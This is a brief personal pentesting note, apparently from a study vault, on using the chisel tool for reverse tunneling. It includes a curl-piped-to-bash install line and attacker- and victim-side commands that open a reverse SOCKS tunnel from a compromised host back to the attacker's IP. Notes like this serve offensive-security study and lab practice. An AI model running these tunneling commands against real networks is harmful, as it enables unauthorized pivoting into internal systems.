---
title: "chisel"
tags:
  - fetus
---
## installation:
```sh
curl https://i.jpillora.com/chisel! | bash
```
## usage:
#### run on attacker (server on reverse mode):
```sh
chisel server --socks5 --reverse -p 1338
```
- will output something like this: <br>
![[chiselServerSS.png]]
#### run on victim (server on reverse mode):
```sh
./chisel client --fingerprint <fingerprint> MYIP:PORT R:8000:10.10.10.5:80
```
- or do `R:socks` set up an automatic socks proxy to use with [[proxychains]] 
- can do `0.0.0.0:1337:192.168.50.2:1337` to pass incoming connections to the client on a specific port to our attacker machine on the specified port. use this in place of `R:` 
